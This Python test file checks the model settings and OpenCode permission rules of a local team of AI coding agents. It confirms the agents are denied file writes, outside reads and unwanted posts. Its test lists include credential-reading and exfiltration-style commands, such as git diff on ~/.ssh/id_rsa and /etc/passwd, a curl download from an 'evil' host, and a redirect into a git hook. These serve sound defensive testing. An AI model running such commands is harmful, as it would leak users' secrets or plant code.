"""The local team's model settings agree: config.json's agents, run-lead.ps1's loaded-model check, opencode.json's limits
and load_model.py's defaults name one model at one context, loaded without memory mapping. Text and pure functions only;
no LM Studio."""
import json
import os
import re
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEAM = os.path.join(ROOT, "tools", "ai-team")
sys.path.insert(0, TEAM)
sys.path.insert(0, os.path.join(TEAM, "guard"))
import allowlist   # noqa: E402
import load_model  # noqa: E402  (imports without the lmstudio SDK; main() imports it)


def read(name, root=TEAM):
    with open(os.path.join(root, name), encoding="utf-8") as f:
        return f.read()


AGENTS = ("fo4-implement", "fo4-lead", "fo4-qa", "fo4-research")


def agent_bash_rules(agent, section="bash"):
    """The (pattern, action) bash rules in an agent's frontmatter, in file order. Every key is quoted, so the pattern
    is read from inside the quotes: a pattern may itself contain a colon (git diff*:*), which a split on ':' would
    mangle into a different rule. section="edit" reads the edit rules the same way."""
    rules, in_bash = [], False
    for line in read(os.path.join(".opencode", "agents", f"{agent}.md"), ROOT).split("\n---\n", 1)[0].splitlines():
        if line == f"  {section}:":
            in_bash = True
        elif in_bash and line.startswith("    "):
            m = re.match(r'\s*"(.*)":\s*(\S+)\s*$', line)
            self_check = m or line.strip().startswith("#")
            assert self_check, f"unparsed {section} rule: {line!r}"
            if m:
                rules.append((m.group(1), m.group(2)))
        elif line and not line.startswith("    "):
            in_bash = False
    return rules


def merged_bash_rules(agent):
    """The root opencode.json bash rules, then the agent's: OpenCode takes the last rule that matches."""
    return list(json.loads(read("opencode.json", ROOT))["permission"]["bash"].items()) + agent_bash_rules(agent)


def _opencode_regex(pattern):
    """OpenCode's wildcard.ts: normalize backslashes, escape regex metacharacters, '*'->'.*', '?'->'.', and treat a
    trailing ' *' as optional. fnmatch does none of this, so a Windows-only false match would slip past it."""
    escaped = re.sub(r"[.+^${}()|\[\]\\]", lambda m: "\\" + m.group(0), pattern.replace("\\", "/"))
    escaped = escaped.replace("*", ".*").replace("?", ".")
    if escaped.endswith(" .*"):
        escaped = escaped[:-3] + "( .*)?"
    return "^" + escaped + "$"


def verdict(rules, command, win32=False):
    """The action of the last rule that matches the command; OpenCode asks when none does. win32=True adds the
    case-insensitive flag of OpenCode's Windows build, where the team's PC runs (a lowercase -r then matches a -R rule).
    The flag is fixed when OpenCode is built for a platform: its 1.18.35 Linux build matches with "s" only, its Windows
    build with "si"; the tests check both."""
    flags = re.DOTALL | (re.IGNORECASE if win32 else 0)
    found = "ask"
    for pattern, action in rules:
        if re.search(_opencode_regex(pattern), command.replace("\\", "/"), flags):
            found = action
    return found


class TeamModelTests(unittest.TestCase):
    def test_every_agent_uses_the_loaders_default_model(self):
        agents = json.loads(read("config.json"))["agents"]
        self.assertEqual(sorted(agents), ["fo4-implement", "fo4-lead", "fo4-qa", "fo4-research"])
        self.assertEqual(set(agents.values()), {load_model.DEFAULT_MODEL})

    def test_run_lead_checks_for_that_model(self):
        m = re.search(r"lms ps 2>&1 \| Out-String\) -match '([^']+)'", read("run-lead.ps1"))
        self.assertIsNotNone(m, "run-lead.ps1 has no loaded-model check")
        pattern = m.group(1)
        self.assertRegex(f"{load_model.DEFAULT_MODEL}    {load_model.DEFAULT_MODEL}    IDLE", pattern)
        self.assertNotRegex("qwen3-14b    qwen3-14b    IDLE", pattern)

    def test_unattended_lead_takes_no_qa_reviews(self):
        script = read("run-lead.ps1")
        self.assertNotIn("needs-qa", script, "the unattended Lead must not pick up QA reviews")
        self.assertNotIn("QA (local)", script)
        self.assertIn("Do not call fo4-qa", script)

    def test_start_team_does_not_advise_the_old_16k_context(self):
        self.assertNotIn("16384", read("start-team.ps1"))

    def test_the_configured_ram_levels_keep_the_35b_idle_level_admitted(self):
        sys.path.insert(0, os.path.join(TEAM, "guardian"))
        import policy
        cfg = dict(policy.DEFAULTS, **json.loads(read("config.json"))["guardian"])
        self.assertLess(cfg["caution_pct"], cfg["restrict_pct"])
        self.assertLess(cfg["restrict_pct"], cfg["ram_block_pct"])

        def level(ram):
            snap = {"gpu": {"available": True, "vram_pct": 85.0}, "ram": {"used_pct": ram},
                    "lmstudio": {"reachable": True, "loaded": [{"id": load_model.DEFAULT_MODEL}]},
                    "agents": {"processes": {}}}
            return policy.level(snap, cfg)[0]
        self.assertEqual(level(87.3), "caution")       # the idle level that got job 66 refused at 85%
        self.assertEqual(level(88.9), "caution")       # the working level that held jobs 109-114 at 88%
        self.assertEqual(level(89.5), "restrict")
        self.assertEqual(level(91.0), "block")

    def test_opencode_limits_match_the_loaded_context(self):
        models = json.loads(read("opencode.json", ROOT))["provider"]["guardian"]["models"]
        self.assertEqual(sorted(models), ["fo4-implement", "fo4-lead", "fo4-qa", "fo4-research"])
        for name, model in models.items():
            self.assertEqual(model["limit"]["context"], load_model.DEFAULT_CONTEXT, name)
            self.assertEqual(model["limit"]["output"], 16384, name)
            # OpenCode compacts at context minus min(output, 32000); the Lead's sessions reached 46K tokens
            self.assertGreaterEqual(model["limit"]["context"] - min(model["limit"]["output"], 32000), 46000, name)

    def test_the_unattended_lead_commits_only_through_the_wrapper(self):
        self.assertIn("lead_commit.py", read("run-lead.ps1"))
        lead = read(os.path.join(".opencode", "agents", "fo4-lead.md"), ROOT)
        self.assertRegex(lead, r'"python -I tools/ai-team/lead_commit.py \*": allow')
        self.assertIn("python -I tools/ai-team/lead_commit.py", read("run-lead.ps1"))
        self.assertNotRegex(lead, r'"git (add|commit)[^"]*": allow')   # no raw git writes
        self.assertRegex(lead, r'"git push\*": deny')
        self.assertRegex(lead, r'"gh pr review\*": deny')
        self.assertRegex(lead, r'"gh pr comment\*": deny')
        self.assertRegex(lead, r'"docs/ai/\*\*": allow')         # the only files it may edit

    def test_run_lead_checks_branch_and_in_progress_before_pulling_and_logs_the_pull(self):
        script = read("run-lead.ps1")
        self.assertNotRegex(script, r"pull[^\n]*2>\$null")          # a failed pull is no longer silent
        self.assertIn("git pull of main failed", script)
        self.assertRegex(script, r"ls-files -u[\s\S]{0,200}skipped: unmerged files")
        self.assertRegex(script, r"unmerged files[^\n]*\$pull")     # the stash/pull output is logged on that skip
        # the branch and the in-progress-operation checks run BEFORE the pull, so no other branch is rebased and no
        # stopped rebase/merge/cherry-pick starts a session on a half-done state (the pull itself can leave those)
        self.assertIn("CHERRY_PICK_HEAD", script)
        self.assertLess(script.index("rev-parse --abbrev-ref HEAD"), script.index("pull -q --rebase"))
        self.assertLess(script.index("CHERRY_PICK_HEAD"), script.index("pull -q --rebase"))
        # the worktree must be ON ai/local-lead and SKIP otherwise, so a moved worktree's other branch is never rebased
        self.assertRegex(script, r"rev-parse --abbrev-ref HEAD[\s\S]{0,200}'ai/local-lead'[\s\S]{0,200}skipped")

    def test_start_team_names_the_loaders_context(self):
        self.assertIn(f"load_model.py ({load_model.DEFAULT_CONTEXT // 1024}K", read("start-team.ps1"))

    def test_provider_header_timeout_outlasts_guardians_queue_wait(self):
        # OpenCode gives up when response headers take longer than headerTimeout. Guardian holds a queued request
        # for queue_wait_s. The hold has to end first, or the Lead's session dies inside the hold.
        header_ms = json.loads(read("opencode.json", ROOT))["provider"]["guardian"]["options"]["headerTimeout"]
        queue_wait_s = json.loads(read("config.json"))["guardian"]["queue_wait_s"]
        self.assertGreater(header_ms, queue_wait_s * 1000)


class LoadConfigTests(unittest.TestCase):
    def test_defaults_are_64k_unquantized_and_unmapped(self):
        self.assertEqual(load_model.DEFAULT_MODEL, "qwen3.6-35b-a3b")
        cfg = load_model.load_config()
        self.assertEqual(cfg, {"contextLength": 65536, "tryMmap": False, "keepModelInMemory": False,
                               "flashAttention": True, "llamaKCacheQuantizationType": "f16",
                               "llamaVCacheQuantizationType": "f16"})

    def test_the_14b_fallback_loads_as_before(self):
        cfg = load_model.load_config(32768, "q8_0", 1.0)
        self.assertEqual(cfg, {"contextLength": 32768, "tryMmap": False, "keepModelInMemory": False,
                               "gpu": {"ratio": 1.0}, "flashAttention": True,
                               "llamaKCacheQuantizationType": "q8_0", "llamaVCacheQuantizationType": "q8_0"})


class LeadPromptTests(unittest.TestCase):
    def test_the_commands_the_lead_is_told_to_run_are_allowed(self):
        # An unattended run refuses any command its bash rules do not allow, so the prompt's examples must match them.
        text = read(os.path.join(".opencode", "agents", "fo4-lead.md"), ROOT)
        self.assertIn("Stay in your worktree", text)
        rules = agent_bash_rules("fo4-lead")
        for command in ("gh issue list --state all --limit 15", "gh issue view 32",
                        "python tools/ai-team/guardian/guardian.py status",
                        "python -I tools/ai-team/lead_commit.py 'refresh agent status'"):
            self.assertEqual(verdict(rules, command), "allow", command)
        # a redirect behind an allowed command (OpenCode matches it as part of the text) is denied, as is lead_commit
        # without -I and any raw git write
        for command in ("git log -1 --format=tformat:x > tools/ai-team/argparse.py",
                        "python -I tools/ai-team/lead_commit.py x > a", "gh issue view 32 2>&1",
                        "python tools/ai-team/lead_commit.py x", "git commit -m x"):
            self.assertIn(verdict(rules, command), ("deny", "ask"), command)
        self.assertEqual(verdict(rules, "git log -1 > .git/hooks/pre-commit"), "deny")
        self.assertEqual(verdict(rules, "git log -1 --format=tformat:x --output=tools/ai-team/guardian/argparse.py"), "deny")
        self.assertEqual(verdict(rules, "git diff --no-index /dev/null ../../outside/secret.txt"), "deny")
        # pipe filters stay unallowed (with a path argument they would read files outside the worktree); the prompt
        # tells the Lead to run gh and git without pipes instead
        for command in ("head -200", "grep -r token C:/Users"):
            self.assertEqual(verdict(rules, command), "ask", command)
        self.assertIn("without pipes", read("run-lead.ps1"))
        for command in ("gh pr review 5 -c -b hi", "gh pr review 5 --approve", "gh pr comment 5 -b hi"):
            self.assertEqual(verdict(rules, command), "deny", command)

    def test_each_team_script_form_the_guard_takes_is_allowed_for_the_agents_that_run_it(self):
        # The guard takes the team's scripts with or without -I, and lead_commit.py only with it. An unattended run
        # ends at the first command its rules do not allow: the Lead's first cycle on the PC (30 Oct) wrote
        # guardian.py status with -I, which only the guard took, and stopped there with no work done.
        commands = [(python + " " + " ".join(script), script[0])
                    for script in allowlist.TEAM_SCRIPTS for python in ("python", "python -I")]
        commands += [(python + " tools/ai-team/guardian/guardian.py report --hours 24", "guardian.py")
                     for python in ("python", "python -I")]
        commands.append(("python -I tools/ai-team/lead_commit.py 'refresh agent status'", "lead_commit.py"))
        for command, script in commands:
            allowlist.check({"root": ROOT, "command": command})      # raises Refused if the guard would not take it
            for agent in ("fo4-implement", "fo4-qa") if script == "scripts/guard.py" else ("fo4-lead",):
                for win32 in (False, True):
                    self.assertEqual(verdict(merged_bash_rules(agent), command, win32), "allow",
                                     (agent, win32, command))
        # and nothing wider, in either form and with either platform's matching: other scripts, -c, -m, the agent
        # wakes, the guardian's switches, extra arguments, and a script path that runs on past the allowed file
        # (Windows drops the .. segments of scripts/guard.py/../../x.py as text and runs x.py)
        root = list(json.loads(read("opencode.json", ROOT))["permission"]["bash"].items())
        wider = ("-c 'print(1)'", "-m pip list", "docs/ai/x.py", "tools/ai-team/load_model.py",
                 "tools/ai-team/wake_agent.py codex", "tools/ai-team/wake_agent.py grok",
                 "tools/ai-team/wake_agent.py status codex", "tools/ai-team/guardian/guardian.py stop",
                 "tools/ai-team/guardian/guardian.py pause", "tools/ai-team/guardian/guardian.py shutdown",
                 "tools/ai-team/guardian/proxy.py", "scripts/guard.py -v", "scripts/other.py",
                 "scripts/guard.py/../../tools/ai-team/wake_agent.py codex", "scripts/guard.py/../../docs/ai/x.py",
                 "scripts/guard.py_x/evil.py", "scripts/guard.py2.py", "tools/ai-team/team.py2.py",
                 "tools/ai-team/team.py/../x.py", "tools/ai-team/lead_commit.py/../x.py")
        for python in ("python", "python -I"):
            for rest in wider:
                for win32 in (False, True):
                    for agent in AGENTS:
                        self.assertNotEqual(verdict(merged_bash_rules(agent), f"{python} {rest}", win32), "allow",
                                            (agent, win32, rest))
                    self.assertNotEqual(verdict(root, f"{python} {rest}", win32), "allow", ("root", win32, rest))
        # the root list on its own (what applies where no agent's rules do: each agent's "*": ask comes after it and
        # wins) allows the guardian's reads in both forms
        for python in ("python", "python -I"):
            for sub in ("status", "report", "report --hours 24"):
                command = f"{python} tools/ai-team/guardian/guardian.py {sub}"
                self.assertEqual(verdict(root, command), "allow", command)


class BashRuleTests(unittest.TestCase):
    # Each command writes a file (a redirect, an --output flag, --no-index) or reads one outside the repo. The last
    # six reach outside without the --no-index flag: git switches to no-index on its own when a path is outside the
    # worktree, so a drive-letter path, a leading-slash absolute path, a ~ or $ the shell expands, and a ../ climb all
    # read an outside file.
    WRITES_OR_READS = (
        "git log > x", "git status > x", "git diff >> x", "git log --output=x", "git log -p --output x",
        "git show --output=x", "git diff --output=x", "git diff --no-index ~/.ssh/config x",
        "python -m unittest > x", "python scripts/guard.py > x",
        "python tools/ai-team/team.py status > tools/ai-team/team.py", "python tools/ai-team/team.py status --output x",
        "python -I tools/ai-team/team.py status > tools/ai-team/team.py",
        "python -I tools/ai-team/team.py status --output x",
        "python -I tools/ai-team/guardian/guardian.py status > x", "python -I scripts/guard.py > x",
        "git diff C:\\Users\\great\\.ssh\\id_rsa README.md", "git diff /etc/passwd README.md",
        "git diff ../../other-worktree/secret.txt README.md", "git diff ~/.ssh/id_rsa README.md",
        "git diff $HOME/.ssh/id_rsa README.md", "git diff $env:USERPROFILE/.ssh/id_rsa README.md",
    )
    # gh issue comment and gh pr review: a local file as the body, another repo, an edit, a delete, or an approval or
    # request-changes through either the long flag or its short form (-a, -r), with --comment only in the body text.
    POSTS = (
        "gh issue comment 32 --body-file ~/.ssh/config", "gh issue comment 32 -F secret.txt",
        "gh issue comment 32 -R other/repo --body hi", "gh issue comment 32 --repo other/repo --body hi",
        "gh issue comment 32 --body hi --edit-last", "gh issue comment 32 --delete-last --yes",
        "gh pr review 5 --comment --body-file x", "gh pr review 5 --comment -R other/repo",
        "gh pr review 5 --comment --approve", "gh pr review 5 -a --body 'looks like --comment'",
        "gh pr review 5 -r --body 'needs work, see --comment'",
    )

    def test_no_agent_can_write_a_file_or_read_one_outside_the_repo(self):
        for agent in AGENTS:
            for rules in (agent_bash_rules(agent), merged_bash_rules(agent)):
                for win32 in (False, True):
                    for command in self.WRITES_OR_READS:
                        self.assertNotEqual(verdict(rules, command, win32), "allow", (agent, win32, command))

    def test_the_lead_cannot_post_a_local_file_approve_or_target_another_repo(self):
        for rules in (agent_bash_rules("fo4-lead"), merged_bash_rules("fo4-lead")):
            for win32 in (False, True):
                for command in self.POSTS:
                    self.assertNotEqual(verdict(rules, command, win32), "allow", (win32, command))

    def test_the_lead_can_still_read_and_comment(self):
        rules = agent_bash_rules("fo4-lead")
        # A normal comment whose body contains "re-run" must not be caught by the -R/-F denies, on Windows too, where
        # the match ignores case ("re-run" has "-r" but not " -r", so a leading-space anchor keeps it clear).
        for win32 in (False, True):
            for command in ("gh issue list --state all --limit 15", "gh issue view 32",
                            "gh issue comment 32 --body 'Lead (local): CI failed, I will re-run it'",
                            "git log --oneline -5", "git diff --stat origin/main",
                            "git diff origin/main..HEAD", "git diff -- docs/ai/agent-status.md",
                            "python tools/ai-team/team.py status"):
                self.assertEqual(verdict(rules, command, win32), "allow", (win32, command))

    def test_no_agent_that_edits_can_write_a_config_folder_or_file_anywhere(self):
        # OpenCode loads a .opencode folder and an opencode.json from the folder it starts in and each folder above it,
        # so a nested one (docs/ai/.opencode/plugin/x.js) would load in a session started there
        nested = ("docs/ai/.opencode/plugin/x.js", "docs/ai/.opencode/agents/fo4-lead.md", "docs/ai/a/.opencode/x",
                  "src/.opencode/plugin/x.js", "docs/ai/opencode.json", "docs/ai/x/opencode.jsonc",
                  ".opencode/plugin/x.js", "opencode.json", "opencode.jsonc")
        for agent, still in (("fo4-lead", "docs/ai/research-log.md"), ("fo4-implement", "src/x.py")):
            rules = agent_bash_rules(agent, "edit")
            for win32 in (False, True):
                for p in nested:
                    self.assertEqual(verdict(rules, p, win32), "deny", (agent, win32, p))
                self.assertEqual(verdict(rules, still, win32), "allow", (agent, win32))
            self.assertEqual(verdict(rules, "docs/ai/.OpenCode/plugin/x.js", True), "deny", agent)   # Windows: any case
        # fo4-research edits two named files only, and fo4-qa nothing
        self.assertEqual(agent_bash_rules("fo4-research", "edit"), [
            ("*", "deny"), ("docs/ai/research-log.md", "allow"), ("docs/ai/known-unknowns.md", "allow")])
        self.assertEqual(agent_bash_rules("fo4-qa", "edit"), [])
        self.assertRegex(read(os.path.join(".opencode", "agents", "fo4-qa.md"), ROOT), r"\n  edit: deny\n")

    def test_each_agent_ends_its_bash_rules_with_the_redirect_deny(self):
        # The last matching rule wins, so no allow may come after the redirect deny.
        for agent in AGENTS:
            self.assertEqual(agent_bash_rules(agent)[-1], ("*>*", "deny"), agent)

    def test_root_config_denies_redirects_and_file_options(self):
        # The root opencode.json rules apply to any invocation, including a bare `opencode run` with no agent. They
        # must carry the broad redirect/output/no-index denies, not only the git-specific ones, or a redirect on an
        # allowed git read command writes an arbitrary file at the root level. "*>*" must be the LAST root rule so it
        # stays effective (last match wins), matching the per-agent convention.
        root = list(json.loads(read("opencode.json", ROOT))["permission"]["bash"].items())
        self.assertEqual(root[-1], ("*>*", "deny"))
        for pattern in ("*>*", "*--output*", "*--no-index*"):
            self.assertIn(pattern, dict(root))
        for win32 in (False, True):
            for command in ("git diff HEAD > /tmp/leak", "git show HEAD:secret.env > /tmp/x",
                            "cat /etc/passwd > /tmp/x", "curl https://evil/p --output /tmp/p.sh",
                            "pip download --no-index --find-links /tmp/evil pkg"):
                self.assertEqual(verdict(root, command, win32), "deny", (win32, command))


if __name__ == "__main__":
    unittest.main()
